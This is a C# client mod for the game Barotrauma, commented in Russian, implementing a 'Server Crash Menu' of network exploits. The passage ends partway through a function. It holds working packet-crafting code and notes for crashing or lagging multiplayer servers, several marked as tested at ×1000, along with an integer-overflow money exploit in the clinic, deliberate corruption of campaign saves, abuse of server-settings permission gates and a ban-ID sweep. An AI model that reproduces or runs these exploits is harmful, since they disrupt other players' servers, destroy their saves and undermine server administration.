using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.IO;
using System.Reflection;
using System.Text;
using Barotrauma;
using Barotrauma.Items.Components;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  SERVER CRASH MENU v5 (волна 599) — по итогам полевых тестов.
    //
    //  ✅ РАБОЧИЕ (проверены юзером, лаг при ×1000):
    //     SegmentTable, SoldItems, CircuitBox opcode, Чат-ордер,
    //     CharacterInput, VOIP
    //  ⚠ ЭКСПЕРИМЕНТАЛЬНО (может не сработать):
    //     EntityState OOM, Inventory OOB (окно ID ненадёжно),
    //     CircuitBox NaN, Backup Indices (исправлен: целимся в
    //     папку сейвов — сервер парсит/декомпрессит каждый бэкап)
    //
    //  ⭐ ИЗБРАННОЕ + ✏ ЗАМЕТКИ (сохраняются в файл рядом с игрой:
    //     CSHUB_crash_menu_notes.txt)
    //  Панель «СКОЛЬКО РАЗ» — множитель для каждого EXEC.
    // ============================================================
    public class ServerCrashMenuModule : CSModuleBase
    {
        public override string Id   => "crash_menu";
        public override string Name => "Crash Menu";
        public override string Description =>
            "v5: избранное ⭐ + твои заметки ✏ (сохр. в файл).\n\n" +
            "• Группа ✅ = проверено тобой в бою\n" +
            "• «N раз» наверху — множитель каждого EXEC\n" +
            "• ★ в строке = в избранное, ✏ = заметка\n" +
            "• DoS = лаг на людном сервере (соло невидим)";

        public override string Category => "exploit";

        private static readonly Color OkColor    = new Color(120, 255, 140);
        private static readonly Color DangerColor= new Color(255, 110, 110);
        private static readonly Color AccentColor= new Color(255, 170, 90);
        private static readonly Color RowColor   = new Color(30, 36, 48);
        private static readonly Color SelColor   = new Color(90, 40, 40);
        private static readonly Color HeadColor  = new Color(45, 55, 75);
        private static readonly Color FavColor   = new Color(255, 230, 120);
        private static readonly Color ExpColor   = new Color(170, 150, 255);

        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBlock _desc;
        private static GUITextBox _noteBox;
        private static GUITextBox _repeatBox;
        private static Method _selectedMethod;

        private class Method
        {
            public string Title;
            public string Desc;
            public Func<int, string> Exec;
        }

        private static readonly Dictionary<string, bool> Fav = new Dictionary<string, bool>();
        private static readonly Dictionary<string, string> Notes = new Dictionary<string, string>();
        private const string NotesFile = "CSHUB_crash_menu_notes.txt";
        private static int _repeat = 100;

        private static readonly Method[] WorkingMethods = new Method[]
        {
            new Method
            {
                Title = "✅ SegmentTable: битый указатель",
                Desc =
"4 байта, чтение таблицы сегментов за буфером.\n" +
"ПРОВЕРЕНО: лаг при ×1000. Без условий (лобби тоже).",
                Exec = ExecSegmentTable
            },
            new Method
            {
                Title = "✅ SoldItems: несуществующий префаб",
                Desc =
"Throw на самом верху кампейн-чтения (до всех проверок).\n" +
"ПРОВЕРЕНО: лаг при ×1000. Условие: кампания.",
                Exec = ExecSoldPrefab
            },
            new Method
            {
                Title = "✅ CircuitBox: левый opcode",
                Desc =
"Прямой пакет с Opcode=AddComponent → throw свитча.\n" +
"ПРОВЕРЕНО: лаг при ×1000. Без условий.",
                Exec = ExecCircuitBox
            },
            new Method
            {
                Title = "✅ Чат: несуществующий ордер",
                Desc =
"Throw на OrderPrefab.Prefabs[id]. Из ЛОББИ тоже.\n" +
"ПРОВЕРЕНО: лаг при ×1000.",
                Exec = ExecChatOrder
            },
            new Method
            {
                Title = "✅ CharacterInput: count=255",
                Desc =
"255 инпутов, данных нет → OOB-чтение.\n" +
"ПРОВЕРЕНО: лаг при ×1000. В раунде.",
                Exec = ExecCharInput
            },
            new Method
            {
                Title = "✅ VOIP: пустые буферы",
                Desc =
"8×255 байт заявлено, 0 данных → BlockCopy за краем.\n" +
"ПРОВЕРЕНО: лаг при ×1000. Голос включён, не в муте.",
                Exec = ExecVoip
            }
        };

        private static readonly Method[] CircuitMethods = new Method[]
        {
            new Method
            {
                Title = "💰 CLINIC OVERFLOW — набор очереди (проверено)",
                Desc =
"Рабочий способ (юзер-конфирм): 11 лёгких пакетов × 3000\n" +
"аффликций × Price=65535 = 33000 → int overflow → цена ≈ -2.13B.\n\n" +
"«N раз» = пакетов (минимум 11 — сам себя добьёт до порога).\n" +
"ПОТОМ жми «💰 ЦИКЛ: +HEAL» или отдельный HEAL.\n\n" +
"НЕ СРАБОТАЛО? Проверь: (1) ты В РАУНДЕ с персонажем,\n" +
"(2) аутпост НЕ в бою (IsOutpostInCombat → Refused молча),\n" +
"(3) кампания запущена.",
                Exec = ExecClinicOverflow
            },
            new Method
            {
                Title = "💰 ЦИКЛ ОДНИМ НАЖАТИЕМ: Overflow+HEAL",
                Desc =
"Автоматика: 11 пакетов набора + HEAL подряд. Reliable-канал\n" +
"гарантирует порядок обработки на сервере — цикл выполняется\n" +
"целиком. Баланс += ~2.13B за нажатие.\n\n" +
"После цикла очередь чистится — жми снова (пауза 5с для\n" +
"rate limit). НЕ в бою на аутпосте!",
                Exec = ExecClinicCycle
            },
            new Method
            {
                Title = "💰 HEAL — получить деньги (+2.1B)",
                Desc =
"Шаг 2 печатного станка: HEAL_PENDING → сервер суммирует\n" +
"замараенную очередь → переполнение → TryPurchase(отрицательная\n" +
"цена) → TryDeduct в минус = БАЛАНС РАСТЁТ на ~2.1B.\n\n" +
"Сначала EXEC «CLINIC OVERFLOW» (≥11 пакетов), потом ЭТА.",
                Exec = ExecClinicHeal
            },
            new Method
            {
                Title = "💰 ОПТИМАЛЬНЫЙ ЦИКЛ (max +2.147B)",
                Desc =
"МАКСИМУМ денег за цикл: сумма 32770×65535 + 2048 = ровно\n" +
"2,147,483,648 → totalCost = int.MinValue → +2,147,483,648 mk.\n" +
"(Старый вариант 33000×65535 давал на 15M меньше — неоптимален.)\n\n" +
"ОДИН пакет (32771 записей) + HEAL. Условия как у OVERFLOW.",
                Exec = ExecClinicOptimal
            },
            new Method
            {
                Title = "💊 FREE HEAL (Price=0, без оверфлоу)",
                Desc =
"БЕЗ денег: твои РЕАЛЬНЫЕ раны + Price=0 → totalCost=0 →\n" +
"TryPurchase(0)=true → лечит тебя БЕСПЛАТНО. Малые пакеты!\n" +
"Это истинный корень 453 (бесплатная клиника).\n\n" +
"⚠ На людном сервере HEAL платит и за ЧУЖИЕ записи в общей\n" +
"очереди. Лучше на соло/дружном. Не в бою на аутпосте.",
                Exec = ExecClinicFreeHeal
            },
            new Method
            {
                Title = "☣ LABEL FLOOD ×N меток (сейв-блоат)",
                Desc =
"cb.AddLabel() ×N — прямой клиентский API (правильные ID).\n" +
"Метки ПЕРСИСТЯТСЯ в сейв кампании. Открой ЦБ и жми.\n" +
"N=10000 — сервер захлёбывается событиями.",
                Exec = ExecLabelFlood
            },
            new Method
            {
                Title = "☣ RENAME CHAOS — все метки в HACKED",
                Desc =
"cb.RenameLabel() всех меток открытого ЦБ. Синк всем игрокам.",
                Exec = ExecRenameChaos
            },
            new Method
            {
                Title = "☣ WIRE CHAOS — все пары связей",
                Desc =
"cb.AddWire() все пары Input×Output = N² проводов.\n" +
"Постоянные события + персистентный блоат сейва.",
                Exec = ExecWireChaos
            }
        };

        private static readonly Method[] OtherDosMethods = new Method[]
        {
            new Method
            {
                Title = "⚠ Backup Indices (FIX: папка сейвов)",
                Desc =
"ИСПРАВЛЕНО: целимся в Saves/Multiplayer/* с wildcard —\n" +
"сервер ДЕКОМПРЕССИРУЕТ каждый найденный бэкап = реальный CPU.\n" +
"C:\\Windows был пуст на совпадения — потому и тишина.\n" +
"Бонус: метаданные сейвов приходят тебе.",
                Exec = ExecBackupScan
            },
            new Method
            {
                Title = "⚠ DescriptionTag (сеттер)",
                Desc =
"КРАШ ПРОЦЕССА (твой подтверждённый). Ставит свойство\n" +
"доступному предмету — сеттер сам шлёт событие.\n" +
"Если дедуп — жми второй вариант (raw).",
                Exec = ExecDescriptionTag
            },
            new Method
            {
                Title = "⚠ DescriptionTag (raw + окно ID)",
                Desc =
"Raw ChangeProperty с окном ID (до 40 событий в пакете).\n" +
"Работает если дедупнут сеттер.",
                Exec = ExecDescriptionTagRaw
            },
            new Method
            {
                Title = "⚠ EventManager option=200 (краш циклом)",
                Desc =
"Смерть на следующем тике. ТОЛЬКО при активном диалоге на тебя.\n" +
"×N = N попыток.",
                Exec = ExecEventManager
            },
            new Method
            {
                Title = "⚠ [SAVE] CircuitBox NaN (MoveComponent)",
                Desc =
"NaN все узлы ЦБ. ПЕРСИСТИТСЯ В СЕЙВ после фиксации!\n" +
"★ Только своя тест-кампания.",
                Exec = ExecCircuitBoxNaN
            },
            new Method
            {
                Title = "☣ ЗАФИКСИРОВАТЬ порчу (сейв кампании)",
                Desc =
"ManageRound(end,save): аутпост сохранит замараенное состояние\n" +
"НАВСЕГДА. Соло/перм ManageRound/окно 586.",
                Exec = ExecForceSave
            }
        };

        private static readonly Method[] PerkMethods = new Method[]
        {
            new Method
            {
                Title = "🎁 ПЕРКИ: MAX стак (таланты+предметы)",
                Desc =
"НОВОЕ (604)! Перк-канал открывается САМ: если НИ У КОГО\n" +
"на сервере нет перма ManageSettings — гейт TRUE для всех.\n" +
"Ставит перки на СЛЕДУЮЩИЙ старт раунда: доп.очки талантов\n" +
"всей команде (GiveTalentPointPerk) + бесплатные предметы\n" +
"в трюм (SpawnItemPerk) + апгрейд сабы. Заполняет все 7 очков.\n\n" +
"Потом кто угодно стартует раунд — перки применяются при спавне.",
                Exec = ExecPerkMaxStack
            },
            new Method
            {
                Title = "🎁 ПЕРКИ: очистить",
                Desc =
"Обнуляет наборы перков обеих команд. Тот же гейт.\n" +
"Полезно вернуть как было после экспериментов.",
                Exec = ExecPerkClear
            },
            new Method
            {
                Title = "🎁 EXTRA CARGO: +10 типов бесплатно",
                Desc =
"SERVER_SETTINGS(Properties): сервер спавнит ExtraCargo В ТРЮМ\n" +
"при КАЖДОМ старте раунда (GameServer:3167). Лимит 20 типов ×\n" +
"10 шт. Гейт = ManageSettings ИЛИ никто не админ (кроме тебя).\n" +
"Набор: штурм. винтовки, дробовики, фуллеритовые стержни.",
                Exec = ExecExtraCargo
            },
            new Method
            {
                Title = "🎁 LEVEL SEED: сид уровня",
                Desc =
"SERVER_SETTINGS(Misc+LevelSeed): добавляет mission type и задаёт\n" +
"КОНКРЕТНЫЙ сид следующего уровня (известные баг-сиды: двойные\n" +
"пещеры, открытые руины, аномалии). Гейт как у перков.",
                Exec = ExecLevelSeed
            },
            new Method
            {
                Title = "🎪 TRAITOR DANGER ×3 + 100% спавн",
                Desc =
"SERVER_SETTINGS(Misc): качает TraitorDangerLevel до MAX (3)\n" +
"через байт-дельту (+0 = ReadByte-1). События предателей\n" +
"максимальной сложности. Отправляет пакет ×N.\n\n" +
"Гейт как у перков: ManageSettings ИЛИ никто не админ.\n" +
"Сработает на пермлесс-сервере. ⚠ Спам пакета = N изменения\n" +
"уровня, видно всем в лобби.",
                Exec = ExecTraitorMax
            },
            new Method
            {
                Title = "🎪 MISSION TYPE: добавить любой тип миссий",
                Desc =
"SERVER_SETTINGS(Misc): добавляет ARBITRARY mission type\n" +
"Identifier в список доступных. Можно активировать тёмные/\n" +
"убранные миссии. ×N = N разных типов.\n\n" +
"Гейт как у перков. Меняет NetLobbyScreen.MissionTypes —\n" +
"влияние на все будущие старты.",
                Exec = ExecMissionType
            },
            new Method
            {
                Title = "🎁 UNBAN SPAM: разморозка по перебору ID",
                Desc =
"SERVER_SETTINGS(Properties)+BanList: c пермами Ban+Unban.\n" +
"UniqueIdentifier банов — счётчик с 0 (static, сброс при рестарте\n" +
"сервера, +1 на каждый бан при загрузке/создании) → sweep 1..N\n" +
"попадает по всем. КЛИЕНТ С ПЕРМОМ BAN ПОЛУЧАЕТ ВЕСЬ БАН-ЛИСТ\n" +
"(имена+ID) серверным синком — точный ID виден там.\n\n" +
"⚠ САМ НЕ СНИМЕШЬ: забаненный не может даже отправить пакет\n" +
"(бан проверяется на КАЖДЫЙ пакет до хендлеров). Снять может\n" +
"только альт с пермами, уже подключённый к серверу.",
                Exec = ExecUnbanSpam
            }
        };

        private static readonly Method[] ExperimentalMethods = new Method[]
        {
            new Method
            {
                Title = "⚠ ЭКСПЕРИМЕНТ: EntityState OOM (1ГБ)",
                Desc =
"msgLength=1ГБ → new byte до проверки. Окно ID НЕНАДЁЖНО\n" +
"(геймплей двигает счётчик) — может молча скипаться.\n" +
"Оставлено для тестов с вербоз-логом сервера.",
                Exec = ExecEntityStateOom
            },
            new Method
            {
                Title = "⚠ ЭКСПЕРИМЕНТ: Inventory start=0 end=255",
                Desc =
"Запись за границу receivedItemIds ближайшего контейнера.\n" +
"Та же проблема окна ID. Может не сработать.",
                Exec = ExecInventoryOob
            },
            new Method
            {
                Title = "⚠ ЭКСПЕРИМЕНТ: Clinic Overflow ГИГАНТ (1 пакет)",
                Desc =
"ОДИН пакет × 33000 аффликций (~400KB). Логика та же, НО:\n" +
"~350 фрагментов по MTU 1170 — по реальному интернету медленно\n" +
"и может теряться (на своём localhost доходит мгновенно).\n" +
"HEAL жми через пару секунд после этого. Если тишина —\n" +
"юзай проверенный набор 11 пакетов выше.",
                Exec = ExecClinicGiant
            },
            new Method
            {
                Title = "⚠ [PERM] SelectMode: modeIndex 9999",
                Desc =
"GameModes[9999] OOB. Нужен перм SelectMode, иначе отказ в логе.",
                Exec = ExecSelectMode
            },
            new Method
            {
                Title = "⚠ [WINDOW] LoadCampaign: мусорный файл",
                Desc =
"C:\\zzz_garbage.save. Сработает в окне 586/соло, иначе молчит.",
                Exec = ExecLoadGarbage
            }
        };

        public override string GetLabel()
        {
            int f = 0;
            foreach (var kv in Fav) { if (kv.Value) { f++; } }
            return f > 0 ? $"Crash Menu 💥 [{f} ⭐]" : "Crash Menu 💥";
        }

        public override void OnClick()
        {
            if (_window != null) { CloseWindow(); return; }
            LoadNotes();
            BuildWindow();
        }

        // ========================================================
        //  ХРАНИЛИЩЕ ЗАМЕТОК/ИЗБРАННОГО
        // ========================================================
        private static void LoadNotes()
        {
            try
            {
                if (!File.Exists(NotesFile)) { return; }
                foreach (string line in File.ReadAllLines(NotesFile))
                {
                    if (string.IsNullOrEmpty(line)) { continue; }
                    string[] parts = line.Split('\t');
                    if (parts.Length < 2) { continue; }
                    if (parts[0] == "F" && parts.Length >= 2)
                    {
                        Fav[parts[1]] = parts[2] == "1";
                    }
                    else if (parts[0] == "N" && parts.Length >= 3)
                    {
                        Notes[parts[1]] = parts[2].Replace("\\n", "\n");
                    }
                }
            }
            catch { }
        }

        private static void SaveNotes()
        {
            try
            {
                var sb = new StringBuilder();
                foreach (var kv in Fav) { sb.Append("F\t").Append(kv.Key).Append('\t').Append(kv.Value ? "1" : "0").Append('\n'); }
                foreach (var kv in Notes)
                {
                    sb.Append("N\t").Append(kv.Key).Append('\t')
                      .Append(kv.Value.Replace("\n", "\\n")).Append('\n');
                }
                File.WriteAllText(NotesFile, sb.ToString());
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] save fail: " + e.Message, DangerColor);
            }
        }

        private static bool IsFav(string title)
        {
            return Fav.ContainsKey(title) && Fav[title];
        }

        // ========================================================
        //  GUI
        // ========================================================
        private static void BuildWindow()
        {
            try
            {
                _window = new GUIMessageBox("Server Crash Menu v5", "", Array.Empty<LocalizedString>(), new Vector2(0.85f, 0.93f));
                var content = _window.Content;
                content.ClearChildren();

                // ---- панель ПОВТОРОВ ----
                var repFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.065f), content.RectTransform, Anchor.TopCenter), style: null);
                repFrame.Color = new Color(60, 45, 30);
                var repLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.85f), repFrame.RectTransform, Anchor.Center), isHorizontal: true);
                var repLabel = new GUITextBlock(
                    new RectTransform(new Vector2(0.4f, 1f), repLayout.RectTransform),
                    "СКОЛЬКО РАЗ (множитель EXEC):", textAlignment: Alignment.CenterLeft);
                repLabel.TextColor = AccentColor;
                repLabel.CanBeFocused = false;
                var boxFrame = new GUIFrame(new RectTransform(new Vector2(0.3f, 1f), repLayout.RectTransform), style: null);
                _repeatBox = new GUITextBox(new RectTransform(Vector2.One, boxFrame.RectTransform), _repeat.ToString());
                var applyBtn = new GUIButton(new RectTransform(new Vector2(0.25f, 1f), repLayout.RectTransform), "OK");
                applyBtn.OnClicked = (b, d) => { ParseRepeat(); return true; };

                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.38f), content.RectTransform, Anchor.TopCenter)
                    { RelativeOffset = new Vector2(0f, 0.07f) });
                _list.Color = new Color(20, 25, 35);

                // ---- избранное наверху ----
                bool anyFav = false;
                foreach (Method m in AllMethods())
                {
                    if (IsFav(m.Title)) { anyFav = true; break; }
                }
                if (anyFav)
                {
                    AddGroupHeader("⭐ ИЗБРАННОЕ", FavColor);
                    foreach (Method m in AllMethods())
                    {
                        if (IsFav(m.Title)) { AddMethodRow(m); }
                    }
                }

                AddGroupHeader("✅ РАБОЧИЕ — проверено в бою", OkColor);
                AddMethods(WorkingMethods);
                AddGroupHeader("☣ CIRCUIT BOX — прямой API (персист в сейв)", DangerColor);
                AddMethods(CircuitMethods);
                AddGroupHeader("⚠ ОСТАЛЬНЫЕ DoS / КРАШ ПРОЦЕССА", AccentColor);
                AddMethods(OtherDosMethods);
                AddGroupHeader("🎁 ПЕРКИ / EXTRA CARGO / СИД (гейт: никто не админ)", OkColor);
                AddMethods(PerkMethods);
                AddGroupHeader("🔧 ЭКСПЕРИМЕНТАЛЬНО / ПЕРМ / ОКНО", ExpColor);
                AddMethods(ExperimentalMethods);

                // ---- нижняя панель: описание + заметка ----
                _desc = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.16f), content.RectTransform, Anchor.BottomCenter)
                        { RelativeOffset = new Vector2(0f, 0.155f) },
                    "Клик по названию = описание. ★ = избранное.", textAlignment: Alignment.CenterLeft);
                _desc.TextColor = AccentColor;
                _desc.CanBeFocused = false;
                try { _desc.Wrap = true; } catch { }

                var noteFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.12f), content.RectTransform, Anchor.BottomCenter), style: null);
                noteFrame.Color = new Color(25, 30, 42);
                var noteLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.9f), noteFrame.RectTransform, Anchor.Center), isHorizontal: true);
                var noteLabel = new GUITextBlock(
                    new RectTransform(new Vector2(0.12f, 1f), noteLayout.RectTransform),
                    "Заметка:", textAlignment: Alignment.CenterLeft);
                noteLabel.TextColor = FavColor;
                noteLabel.CanBeFocused = false;
                var noteBoxFrame = new GUIFrame(new RectTransform(new Vector2(0.6f, 1f), noteLayout.RectTransform), style: null);
                _noteBox = new GUITextBox(new RectTransform(Vector2.One, noteBoxFrame.RectTransform), "");
                try { _noteBox.MaxTextLength = 400; } catch { }
                var saveNoteBtn = new GUIButton(new RectTransform(new Vector2(0.14f, 0.9f), noteLayout.RectTransform), "💾 Сохр.");
                saveNoteBtn.Color = new Color(60, 110, 60);
                saveNoteBtn.OnClicked = (b, d) => { SaveNoteForSelected(); return true; };
                var delNoteBtn = new GUIButton(new RectTransform(new Vector2(0.13f, 0.9f), noteLayout.RectTransform), "🗑 Удалить");
                delNoteBtn.Color = new Color(110, 60, 60);
                delNoteBtn.OnClicked = (b, d) => { DeleteNoteForSelected(); return true; };
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] GUI fail: " + e.Message, DangerColor);
                CloseWindow();
            }
        }

        private static IEnumerable<Method> AllMethods()
        {
            foreach (Method m in WorkingMethods) { yield return m; }
            foreach (Method m in CircuitMethods) { yield return m; }
            foreach (Method m in OtherDosMethods) { yield return m; }
            foreach (Method m in PerkMethods) { yield return m; }
            foreach (Method m in ExperimentalMethods) { yield return m; }
        }

        private static void ParseRepeat()
        {
            if (_repeatBox == null) { return; }
            int v;
            if (int.TryParse(_repeatBox.Text.Trim(), out v) && v > 0)
            {
                _repeat = Math.Min(v, 10000);
                _repeatBox.Text = _repeat.ToString();
                GUI.AddMessage("[CrashMenu] множитель = " + _repeat, AccentColor);
            }
        }

        private static void AddGroupHeader(string text, Color color)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.07f), _list.Content.RectTransform), style: null);
            row.Color = HeadColor;
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.CenterLeft);
            txt.TextColor = color;
            txt.CanBeFocused = false;
            AddSpacer();
        }

        private static void AddSpacer()
        {
            var gap = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.02f), _list.Content.RectTransform), style: null);
            gap.Color = new Color(15, 18, 26);
            gap.CanBeFocused = false;
        }

        private static void AddMethods(Method[] methods)
        {
            foreach (Method m in methods) { AddMethodRow(m); }
        }

        private static void AddMethodRow(Method m)
        {
            Method mm = m;
            bool fav = IsFav(mm.Title);
            string note;
            bool hasNote = Notes.TryGetValue(mm.Title, out note);

            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.1f), _list.Content.RectTransform), style: null);
            row.Color = fav ? new Color(90, 76, 32) : new Color(45, 54, 70);
            var layout = new GUILayoutGroup(
                new RectTransform(new Vector2(0.985f, 1f), row.RectTransform, Anchor.Center), isHorizontal: true);
            try { layout.RelativeSpacing = 0.012f; } catch { }

            var favBtn = new GUIButton(
                new RectTransform(new Vector2(0.06f, 1f), layout.RectTransform),
                fav ? "★" : "☆");
            favBtn.Color = fav ? new Color(180, 145, 40) : new Color(80, 90, 110);
            favBtn.HoverColor = new Color(120, 110, 60);
            favBtn.OnClicked = (b, d) =>
            {
                Fav[mm.Title] = !IsFav(mm.Title);
                SaveNotes();
                RebuildList();
                return true;
            };

            var execBtn = new GUIButton(
                new RectTransform(new Vector2(0.14f, 1f), layout.RectTransform), "EXEC ▶");
            execBtn.Color = new Color(150, 60, 60);
            execBtn.HoverColor = new Color(190, 80, 80);
            execBtn.OnClicked = (b, d) =>
            {
                ParseRepeat();
                ShowDesc(mm);
                RunExec(mm);
                return true;
            };

            string title = mm.Title + (hasNote ? "  ✏" : "");
            var nameBtn = new GUIButton(
                new RectTransform(new Vector2(0.79f, 1f), layout.RectTransform),
                title, textAlignment: Alignment.CenterLeft);
            nameBtn.Color = fav ? new Color(110, 95, 40) : new Color(60, 72, 95);
            nameBtn.HoverColor = new Color(85, 100, 130);
            if (hasNote) { nameBtn.ToolTip = "Заметка: " + note; }
            nameBtn.OnClicked = (b, d) =>
            {
                ShowDesc(mm);
                if (_noteBox != null) { _noteBox.Text = hasNote ? note : ""; }
                _selectedMethod = mm;
                return true;
            };

            AddSpacer();
        }

        private static void RebuildList()
        {
            if (_list == null) { return; }
            _list.Content.ClearChildren();
            bool anyFav = false;
            foreach (Method m in AllMethods())
            {
                if (IsFav(m.Title)) { anyFav = true; break; }
            }
            if (anyFav)
            {
                AddGroupHeader("⭐ ИЗБРАННОЕ", FavColor);
                foreach (Method m in AllMethods())
                {
                    if (IsFav(m.Title)) { AddMethodRow(m); }
                }
            }
            AddGroupHeader("✅ РАБОЧИЕ — проверено в бою", OkColor);
            AddMethods(WorkingMethods);
            AddGroupHeader("☣ CIRCUIT BOX — прямой API (персист в сейв)", DangerColor);
            AddMethods(CircuitMethods);
            AddGroupHeader("⚠ ОСТАЛЬНЫЕ DoS / КРАШ ПРОЦЕССА", AccentColor);
            AddMethods(OtherDosMethods);
            AddGroupHeader("🎁 ПЕРКИ / EXTRA CARGO / СИД (гейт: никто не админ)", OkColor);
            AddMethods(PerkMethods);
            AddGroupHeader("🔧 ЭКСПЕРИМЕНТАЛЬНО / ПЕРМ / ОКНО", ExpColor);
            AddMethods(ExperimentalMethods);
        }

        private static void ShowDesc(Method m)
        {
            if (_desc == null) { return; }
            string note;
            bool hasNote = Notes.TryGetValue(m.Title, out note);
            _desc.Text = m.Title + "  ×" + _repeat +
                (hasNote ? "\n✏ Заметка: " + note : "") +
                "\n──────────────────────────────\n" + m.Desc;
            _desc.TextColor = AccentColor;
        }

        private static void SaveNoteForSelected()
        {
            if (_selectedMethod == null || _noteBox == null)
            {
                GUI.AddMessage("[CrashMenu] Сначала выбери метод (клик по названию)", AccentColor);
                return;
            }
            string text = _noteBox.Text.Trim();
            if (string.IsNullOrEmpty(text)) { DeleteNoteForSelected(); return; }
            Notes[_selectedMethod.Title] = text;
            SaveNotes();
            GUI.AddMessage("[CrashMenu] ✏ заметка сохранена: " + _selectedMethod.Title, OkColor);
            RebuildList();
        }

        private static void DeleteNoteForSelected()
        {
            if (_selectedMethod == null) { return; }
            if (Notes.Remove(_selectedMethod.Title))
            {
                SaveNotes();
                GUI.AddMessage("[CrashMenu] заметка удалена", AccentColor);
                RebuildList();
            }
        }

        private static void RunExec(Method m)
        {
            try
            {
                string result = m.Exec(_repeat);
                GUI.AddMessage("[CrashMenu] " + result, OkColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] " + m.Title + ": " + e.Message, DangerColor);
            }
        }

        // ========================================================
        //  ХЕЛПЕРЫ
        // ========================================================
        private static bool CanSend() { return GameMain.Client?.ClientPeer != null; }
        private static bool InRound() { return GameMain.Client.GameStarted && Character.Controlled != null; }

        private static ushort CurrentLocIndex()
        {
            try
            {
                var map = GameMain.GameSession?.Campaign?.Map;
                if (map?.CurrentLocation != null)
                {
                    int idx = map.Locations.IndexOf(map.CurrentLocation);
                    if (idx >= 0) { return (ushort)idx; }
                }
            }
            catch { }
            return 0;
        }

        private static ushort RealNextEventId()
        {
            try
            {
                var em = GameMain.Client.EntityEventManager;
                if (em != null)
                {
                    var f = typeof(ClientEntityEventManager).GetField("ID",
                        BindingFlags.NonPublic | BindingFlags.Instance);
                    if (f != null)
                    {
                        object v = f.GetValue(em);
                        if (v is ushort u) { return (ushort)(u + 1); }
                        if (v is int i) { return (ushort)(i + 1); }
                    }
                }
            }
            catch { }
            try { return (ushort)(GameMain.Client.LastSentEntityEventID + 1); } catch { }
            return 0;
        }

        private static string SendSweep(ushort entityId, IWriteMessage payload, int count)
        {
            count = Math.Max(1, Math.Min(count, 40));
            ushort start = (ushort)(RealNextEventId() - 8);

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                msg.WritePadBits();
                msg.WriteUInt16(start);
                msg.WriteByte((byte)count);
                for (int i = 0; i < count; i++)
                {
                    msg.WriteUInt16(entityId);
                    msg.WriteVariableUInt32((uint)(payload.LengthBytes + 2));
                    msg.WriteUInt16(0);
                    msg.WriteBytes(payload.Buffer, 0, payload.LengthBytes);
                }
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "sweep " + count + "× (start=" + start + ")";
        }

        private static Item SelectedOrNearestCircuitBox(out CircuitBox cb)
        {
            cb = null;
            Character me = Character.Controlled;
            Item item = null;
            try
            {
                if (me?.SelectedItem != null)
                {
                    CircuitBox c = null;
                    try { c = me.SelectedItem.GetComponent<CircuitBox>(); } catch { }
                    if (c != null) { item = me.SelectedItem; cb = c; }
                }
            }
            catch { }
            if (item != null) { return item; }

            float bestD = 600f;
            if (me == null) { return null; }
            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                CircuitBox c = null;
                try { c = it.GetComponent<CircuitBox>(); } catch { }
                if (c == null) { continue; }
                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                if (d < bestD) { bestD = d; item = it; cb = c; }
            }
            return item;
        }

        // ========================================================
        //  МЕТОДЫ
        // ========================================================
        // ========================================================
        //  💰 CLINIC OVERFLOW (волна 600): Price-переполнение
        // ========================================================
        private const int ClinicHeaderAddPending = 4;    // MedicalClinic.NetworkHeader.ADD_PENDING
        private const int ClinicHeaderHeal = 7;          // MedicalClinic.NetworkHeader.HEAL_PENDING

        // Лёгкий ADD_PENDING (проверенный путь): perPacket аффликций в одном member
        private static void SendClinicAddPending(int perPacket, int idBase)
        {
            SendClinicAddPending(perPacket, idBase, 65535);
        }

        private static void SendClinicAddPending(int perPacket, int idBase, ushort price)
        {
            var afflictions = new MedicalClinic.NetAffliction[perPacket];
            for (int i = 0; i < perPacket; i++)
            {
                afflictions[i] = new MedicalClinic.NetAffliction
                {
                    Identifier = "zzz_clinic_overflow".ToIdentifier(),
                    Strength = 0,
                    VitalityDecrease = 0,
                    Price = price
                };
            }
            var member = new MedicalClinic.NetCrewMember
            {
                CharacterInfoID = idBase,
                Afflictions = ImmutableArray.Create(afflictions)
            };
            IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
            msg.WriteByte(ClinicHeaderAddPending);
            ((INetSerializableStruct)member).Write(msg);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
        }

        private static void SendClinicHealPacket()
        {
            IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.MEDICAL);
            msg.WriteByte(ClinicHeaderHeal);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
        }

        private static string ExecClinicOverflow(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде (кошелёк персонажа)"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }

            // Проверенный путь: 11 пакетов × 3000 = 33000 аффликций (порог 32770)
            int packets = Math.Max(11, Math.Min(n, 20));
            for (int p = 0; p < packets; p++)
            {
                SendClinicAddPending(3000, 90000 + p);
            }
            return "ADD_PENDING ×" + packets + " (" + (packets * 3000) +
                   " аффликций — порог 32770 пройден). Теперь «💰 ЦИКЛ» или отдельный HEAL!";
        }

        private static string ExecClinicCycle(int n)
        {
